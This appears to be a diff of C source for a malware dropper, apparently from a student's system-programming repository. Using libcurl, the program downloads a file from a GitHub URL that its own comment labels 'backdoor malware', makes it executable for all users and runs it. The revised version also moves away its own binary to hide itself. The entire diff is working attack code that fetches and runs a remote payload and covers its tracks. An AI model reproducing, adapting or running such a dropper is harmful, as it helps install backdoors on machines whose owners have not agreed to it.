@@ -12,8 +12,9 @@ size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream){
     return written;
 
 }
-void execAndDel(char* fileName){
+void delMe(char* fileName){
 
+    //move too /homeDir/destFile to hide
     char* homeDir = getenv("HOME");
     char destFile[1024];
    
@@ -34,20 +35,17 @@ void execAndDel(char* fileName){
 
 	}
 
-    execl(destFile, (char*)NULL);
-	
-	return 0;
-
 }
 
-int main(){
+int main(int argc, char** argv){
 
     CURL *curl;
     FILE *fs;
     CURLcode res;
 
-    char const* url = "https://github.com/huyenlovemath/Malware/raw/master/backdoor/backdoor";
-    char outfilename[FILENAME_MAX] = "downloader";
+    //download backdoor malware
+    char const* url = "https://github.com/huyenlovemath/System-Programming/raw/master/backdoor/backdoor";
+    char outfilename[FILENAME_MAX] = "downloaderMalware";
 
     if (curl_global_init(CURL_GLOBAL_ALL)){
 
@@ -83,7 +81,7 @@ int main(){
     curl_easy_cleanup(curl);
     curl_global_cleanup();
 
-    if (chmod("downloader", S_IRWXU | S_IRWXO | S_IRWXG) == -1){
+    if (chmod("downloaderMalware", S_IRWXU | S_IRWXO | S_IRWXG) == -1){
 
         printf("chmod failed\n");
         return 1;
@@ -92,7 +90,8 @@ int main(){
 
 
     fclose(fs);
-    execAndDel(outfilename);
+    delMe(argv[0]);
+    execl("./downloaderMalware", (char*)NULL);
    
     return 1;
 
